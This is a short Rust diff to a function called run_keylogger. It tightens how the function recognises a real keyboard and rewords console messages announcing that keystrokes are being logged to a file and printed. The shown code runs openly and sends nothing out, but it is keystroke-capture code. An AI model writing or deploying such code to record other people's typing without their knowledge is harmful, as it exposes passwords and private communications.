@@ -24,9 +24,13 @@ pub fn run_keylogger(log_path: &str) {
         // A real keyboard should support letter keys like KEY_A
         if let Some(keys) = device.supported_keys() {
             // Check if device supports basic letter keys (indicates it's a real keyboard)
+            // We check for multiple letter keys across the keyboard to ensure it's a typing
+            // keyboard, not just a device with a few control keys (like mice or audio controls)
             let has_letter_keys = keys.contains(Key::KEY_A) 
                 && keys.contains(Key::KEY_Z)
-                && keys.contains(Key::KEY_ENTER);
+                && keys.contains(Key::KEY_M)  // Middle of alphabet
+                && keys.contains(Key::KEY_ENTER)
+                && keys.contains(Key::KEY_SPACE);
             
             if has_letter_keys {
                 let name = device.name().unwrap_or("Unknown");
@@ -85,8 +89,9 @@ pub fn run_keylogger(log_path: &str) {
         std::process::exit(1);
     }
 
-    println!("Keylogger is now active. Press keys to see them logged.");
-    println!("Output will be saved to: {}", log_path);
+    println!("Keylogger is now active and monitoring keyboards.");
+    println!("Keys will be logged to: {}", log_path);
+    println!("Keys will also be printed to this console.");
     println!("Press Ctrl+C to stop.\n");
     
     writeln!(file, "=== Monitoring started, waiting for key events ===")
